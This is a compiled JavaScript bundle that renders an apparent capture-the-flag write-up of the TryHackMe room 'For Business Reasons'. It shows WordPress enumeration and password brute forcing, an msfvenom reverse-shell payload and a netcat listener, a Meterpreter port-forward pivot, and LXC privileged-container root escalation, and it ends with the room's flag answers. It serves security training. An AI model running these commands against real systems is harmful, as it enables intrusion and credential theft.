"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8443],{3905:(e,n,t)=>{t.d(n,{Zo:()=>_,kt:()=>m});var s=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);n&&(s=s.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,s)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,s,r=function(e,n){if(null==e)return{};var t,s,r={},a=Object.keys(e);for(s=0;s<a.length;s++)t=a[s],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(s=0;s<a.length;s++)t=a[s],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var p=s.createContext({}),l=function(e){var n=s.useContext(p),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},_=function(e){var n=l(e.components);return s.createElement(p.Provider,{value:n},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return s.createElement(s.Fragment,{},n)}},c=s.forwardRef((function(e,n){var t=e.components,r=e.mdxType,a=e.originalType,p=e.parentName,_=i(e,["components","mdxType","originalType","parentName"]),d=l(t),c=r,m=d["".concat(p,".").concat(c)]||d[c]||u[c]||a;return t?s.createElement(m,o(o({ref:n},_),{},{components:t})):s.createElement(m,o({ref:n},_))}));function m(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var a=t.length,o=new Array(a);o[0]=c;var i={};for(var p in n)hasOwnProperty.call(n,p)&&(i[p]=n[p]);i.originalType=e,i[d]="string"==typeof e?e:r,o[1]=i;for(var l=2;l<a;l++)o[l]=t[l];return s.createElement.apply(null,o)}return s.createElement.apply(null,t)}c.displayName="MDXCreateElement"},84052:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>p,contentTitle:()=>o,default:()=>u,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var s=t(87462),r=(t(67294),t(3905));const a={},o="For Business Reasons",i={unversionedId:"Tryhackme/For Business Reasons/For Business Reasons",id:"Tryhackme/For Business Reasons/For Business Reasons",title:"For Business Reasons",description:"In your network scan, you found an unknown VM....",source:"@site/writeups/Tryhackme/For Business Reasons/For Business Reasons.md",sourceDirName:"Tryhackme/For Business Reasons",slug:"/Tryhackme/For Business Reasons/",permalink:"/writeups/Tryhackme/For Business Reasons/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Erit Securus I",permalink:"/writeups/Tryhackme/Erit Securus I/"},next:{title:"Forensics",permalink:"/writeups/Tryhackme/Forensics/"}},p={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 For Business Reasons",id:"task-1-for-business-reasons",level:2}],_={toc:l},d="wrapper";function u(e){let{components:n,...t}=e;return(0,r.kt)(d,(0,s.Z)({},_,t,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"for-business-reasons"},"For Business Reasons"),(0,r.kt)("p",null,"In your network scan, you found an unknown VM...."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/forbusinessreasons"},"For Business Reasons")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Enumeration (Wordpress)"),(0,r.kt)("li",{parentName:"ul"},"Brute Forcing (Wordpress)"),(0,r.kt)("li",{parentName:"ul"},"Exploitation (Wordpress)"),(0,r.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,r.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,r.kt)("li",{parentName:"ul"},"Network Tunneling"),(0,r.kt)("li",{parentName:"ul"},"Exploitation (LXC)")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-for-business-reasons"},"Task 1 For Business Reasons"),(0,r.kt)("p",null,"You find a Host run by MilkCo","*",", run by a competent but not perfect team of sysadmins... But teams make mistakes."),(0,r.kt)("p",null,"Immature teams often do things like have all the elements of security like strict firewalls but then throw it all away by not understanding a technology or using shared passwords."),(0,r.kt)("p",null,"This is a hyper-realistic room. This room also features a difficult pivot."),(0,r.kt)("p",null,"*",(0,r.kt)("em",{parentName:"p"},"MilkCo is totally made up.")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/For Business Reasons$ sudo nmap -A -sC -sV -sS -O 10.10.133.94\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 21:41 CEST\nNmap scan report for 10.10.133.94\nHost is up (0.033s latency).\nNot shown: 998 filtered ports\nPORT   STATE  SERVICE VERSION\n22/tcp closed ssh\n80/tcp open   http    Apache httpd 2.4.38 ((Debian))\n|_http-generator: WordPress 5.4.2\n| http-robots.txt: 1 disallowed entry\n|_/wp-admin/\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: MilkCo Test/POC site &#8211; Just another WordPress site\nAggressive OS guesses: HP P2000 G3 NAS device (91%), OpenWrt 12.09-rc1 Attitude Adjustment (Linux 3.3 - 3.7) (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 (90%), Linux 2.6.26 - 2.6.35 (89%), Linux 2.6.32 - 3.13 (89%), Linux 2.6.32 - 3.4.1 (89%), Linux 3.0 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   32.53 ms 10.8.0.1\n2   32.62 ms 10.10.133.94\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.34 seconds\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/For Business Reasons$ gobuster dir -u 10.10.133.94 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.133.94\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/15 21:42:32 Starting gobuster\n===============================================================\n/images (Status: 200)\n/rss (Status: 301)\n/0 (Status: 301)\n/feed (Status: 301)\n/atom (Status: 301)\n/wp-content (Status: 301)\n/rss2 (Status: 301)\n/wp-includes (Status: 301)\n/mysql (Status: 301)\n/rdf (Status: 301)\n/page1 (Status: 301)\n/' (Status: 301)\n/%20 (Status: 301)\nProgress: 4034 / 220561 (1.83%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/15 21:45:33 Finished\n===============================================================\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.133.94/robots.txt"},"http://10.10.133.94/robots.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"User-agent: *\nDisallow: /wp-admin/\nAllow: /wp-admin/admin-ajax.php\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/For Business Reasons$ wpscan --url 10.10.133.94 --enumerate vp,vt,u,dbe\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \xae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.1\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.133.94/ [10.10.133.94]\n[+] Started: Thu Oct 15 21:45:37 2020\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: Apache/2.4.38 (Debian)\n |  - X-Powered-By: PHP/7.2.33\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] http://10.10.133.94/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.133.94/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n\n[+] http://10.10.133.94/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.133.94/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).\n | Found By: Emoji Settings (Passive Detection)\n |  - http://10.10.133.94/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2'\n | Confirmed By: Meta Generator (Passive Detection)\n |  - http://10.10.133.94/, Match: 'WordPress 5.4.2'\n\n[i] The main theme could not be detected.\n\n[+] Enumerating Vulnerable Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:00:06 <===============> (329 / 329) 100.00% Time: 00:00:06\n\n[i] No themes Found.\n\n[+] Enumerating DB Exports (via Passive and Aggressive Methods)\n Checking DB Exports - Time: 00:00:00 <======================> (36 / 36) 100.00% Time: 00:00:00\n\n[i] No DB Exports Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:01 <===================================================================================================================> (10 / 10) 100.00% Time: 00:00:01\n\n[i] User(s) Identified:\n\n[+] sysadmin\n | Found By: Wp Json Api (Aggressive Detection)\n |  - http://10.10.133.94/wp-json/wp/v2/users/?per_page=100&page=1\n | Confirmed By:\n |  Rss Generator (Aggressive Detection)\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up\n\n[+] Finished: Thu Oct 15 21:48:59 2020\n[+] Requests Done: 417\n[+] Cached Requests: 5\n[+] Data Sent: 93.299 KB\n[+] Data Received: 328.199 KB\n[+] Memory used: 189.023 MB\n[+] Elapsed time: 00:03:22\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/For Business Reasons$ wpscan --url 10.10.133.94 --passwords /usr/share/wordlists/rockyou.txt --usernames sysadmin\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \xae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.1\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.133.94/ [10.10.133.94]\n[+] Started: Thu Oct 15 21:50:30 2020\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: Apache/2.4.38 (Debian)\n |  - X-Powered-By: PHP/7.2.33\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] http://10.10.133.94/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.133.94/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n\n[+] http://10.10.133.94/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.133.94/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).\n | Found By: Emoji Settings (Passive Detection)\n |  - http://10.10.133.94/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2'\n | Confirmed By: Meta Generator (Passive Detection)\n |  - http://10.10.133.94/, Match: 'WordPress 5.4.2'\n\n[i] The main theme could not be detected.\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:00 <====================================================================================================================> (21 / 21) 100.00% Time: 00:00:00\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Xmlrpc against 1 user/s\nTrying sysadmin / milkshake Time: 00:00:53 <===============================================================================================================> (1665 / 1665) 100.00% Time: 00:00:53\n[SUCCESS] - sysadmin / milkshake\n\n[!] Valid Combinations Found:\n | Username: sysadmin, Password: milkshake\n\n[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up\n\n[+] Finished: Thu Oct 15 21:52:09 2020\n[+] Requests Done: 1690\n[+] Cached Requests: 27\n[+] Data Sent: 828.526 KB\n[+] Data Received: 1.053 MB\n[+] Memory used: 1.015 GB\n[+] Elapsed time: 00:01:38\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"sysadmin:milkshake")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.133.94/wp-admin/plugin-install.php"},"http://10.10.133.94/wp-admin/plugin-install.php")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/For Business Reasons$ nc -lnvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.133.94] 38620\nLinux 4e4ae262d6e7 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 GNU/Linux\n 20:03:31 up 22 min,  0 users,  load average: 0.00, 0.14, 0.55\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@4e4ae262d6e7:/$ whoami\nwhoami\nwww-data\nwww-data@4e4ae262d6e7:/home$ cd /var/www/html\ncd /var/www/html\nwww-data@4e4ae262d6e7:/var/www/html$ ls\nls\nflag0.txt\ngetip\nimages\nindex.php\nlicense.txt\nlost+found\nmysql\nnote.txt\nreadme.html\nstart.log\nstart_container.sh\ntest.sh\nupdate.log\nupdate.sh\nwordpress_stack.yml\nwp-activate.php\nwp-admin\nwp-blog-header.php\nwp-comments-post.php\nwp-config-sample.php\nwp-config.php\nwp-content\nwp-cron.php\nwp-includes\nwp-links-opml.php\nwp-load.php\nwp-login.php\nwp-mail.php\nwp-settings.php\nwp-signup.php\nwp-trackback.php\nxmlrpc.php\nwww-data@4e4ae262d6e7:/var/www/html$ cat flag0.txt\ncat flag0.txt\nya7ooShiivagaipi\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@4e4ae262d6e7:/var/www/html$ cat wordpress_stack.yml\ncat wordpress_stack.yml\nversion: '3.1'\n\nservices:\n\n  wordpress:\n    image: wordpress:php7.2-apache\n    restart: always\n    ports:\n      - 80:80\n    environment:\n      WORDPRESS_DB_HOST: db\n      WORDPRESS_DB_USER: wpdbuser\n      WORDPRESS_DB_PASSWORD: Ceixahz5\n      WORDPRESS_DB_NAME: wpdb\n    volumes:\n      - /data:/var/www/html/\n\n  db:\n    image: mysql:5.7\n    restart: always\n    environment:\n      MYSQL_DATABASE: wpdb\n      MYSQL_USER: wpdbuser\n      MYSQL_PASSWORD: Ceixahz5\n      MYSQL_RANDOM_ROOT_PASSWORD: '1'\n    volumes:\n      - /data/mysql:/var/lib/mysql\n\nvolumes:\n  wordpress:\n  db:\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.8.106.222 LPORT=9002 -f elf > shell.elf\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/For Business Reasons$ nc -lnvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.133.94] 38664\nLinux 4e4ae262d6e7 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 GNU/Linux\n 21:06:12 up  1:25,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@4e4ae262d6e7:/$ clear\nclear\nTERM environment variable not set.\nwww-data@4e4ae262d6e7:/$ cd /tmp\ncd /tmp\nwww-data@4e4ae262d6e7:/tmp$ ls\nls\nnc\nnetcat\npear\nshell.elf\ntmp\nwww-data@4e4ae262d6e7:/tmp$ ./shell.elf\n./shell.elf\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/For Business Reasons$ sudo msfconsole -q\n[sudo] password for kali:\nmsf5 > use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp\npayload => linux/x64/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) > options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (linux/x64/meterpreter_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf5 exploit(multi/handler) > set LHOST tun0\nLHOST => 10.8.106.222\nmsf5 exploit(multi/handler) > set LPORT 9002\nLPORT => 9002\nmsf5 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.8.106.222:9002\n[*] Meterpreter session 1 opened (10.8.106.222:9002 -> 10.10.133.94:48290) at 2020-10-15 23:07:43 +0200\n\nmeterpreter > route\n\nIPv4 network routes\n===================\n\n    Subnet      Netmask        Gateway     Metric  Interface\n    ------      -------        -------     ------  ---------\n    0.0.0.0     0.0.0.0        172.18.0.1  0       eth2\n    10.0.0.0    255.255.255.0  0.0.0.0     0       eth1\n    10.255.0.0  255.255.0.0    0.0.0.0     0       eth0\n    172.18.0.0  255.255.0.0    0.0.0.0     0       eth2\n\nNo IPv6 routes were found.\nmeterpreter > portfwd -l 22 -p 22 -r 172.18.0.1\nUsage: portfwd [-h] [add | delete | list | flush] [args]\n\n\nOPTIONS:\n\n    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.\n    -R        Indicates a reverse port forward.\n    -h        Help banner.\n    -i <opt>  Index of the port forward entry to interact with (see the "list" command).\n    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.\n    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.\n    -r <opt>  Forward: remote host to connect to.\nmeterpreter > portfwd add -l 22 -p 22 -r 172.18.0.1\n[*] Local TCP relay created: :22 <-> 172.18.0.1:22\nmeterpreter >\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/For Business Reasons$ ssh sysadmin@localhost\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:YWh6/YCN0RzHZZK5fdUZ2EB9I2CQSoW4XAZ5/V+CYUc.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.\nsysadmin@localhost's password:\nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n263 packages can be updated.\n181 updates are security updates.\n\n\nLast login: Sun Aug  9 15:30:13 2020 from 192.168.191.131\nsysadmin@ubuntu:~$ ls\nflag1.txt\nsysadmin@ubuntu:~$ cat flag1.txt\nosh4loNi\nsysadmin@ubuntu:~$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"sysadmin@ubuntu:~$ wget http://10.8.106.222/alpine-v3.12-x86_64-20201015_2323.tar.gz\n--2020-10-15 17:24:37--  http://10.8.106.222/alpine-v3.12-x86_64-20201015_2323.tar.gz\nConnecting to 10.8.106.222:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3183826 (3.0M) [application/gzip]\nSaving to: \u2018alpine-v3.12-x86_64-20201015_2323.tar.gz\u2019\n\nalpine-v3.12-x86_6 100%[=============>]   3.04M  3.27MB/s    in 0.9s\n\n2020-10-15 17:24:38 (3.27 MB/s) - \u2018alpine-v3.12-x86_64-20201015_2323.tar.gz\u2019 saved [3183826/3183826]\n\nsysadmin@ubuntu:~$ lxc image import ./alpine-v3.12-x86_64-20201015_2323.tar.gz --alias myimage\nImage imported with fingerprint: 7924e55c121c96464757d79c0782608607a759a548a4b9f9d58feeb6857500a4\nsysadmin@ubuntu:~$ lxc image list\n+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |\n+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| myimage | 7924e55c121c | no     | alpine v3.12 (20201015_23:23) | x86_64 | 3.04MB | Oct 15, 2020 at 9:25pm (UTC) |\n+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+\nsysadmin@ubuntu:~$ lxc init myimage alpine -c security.privileged=true\nCreating alpine\nsysadmin@ubuntu:~$ lxc config device add alpine mydevice disk source=/ path=/mnt/root recursive=true\nDevice mydevice added to alpine\nsysadmin@ubuntu:~$ lxc start alpine\nsysadmin@ubuntu:~$ lxc exec alpine /bin/sh\n~ # whoami\nroot\n~ # cd /root\n~ # ls\n~ # cd /mnt/root/\n/mnt/root # cd root/\n/mnt/root/root # cat root.txt\nKainiy1Onoonoh3j\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"What is flag 0?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"ya7ooShiivagaipi")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"osh4loNi")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Kainiy1Onoonoh3j")))}u.isMDXComponent=!0}}]);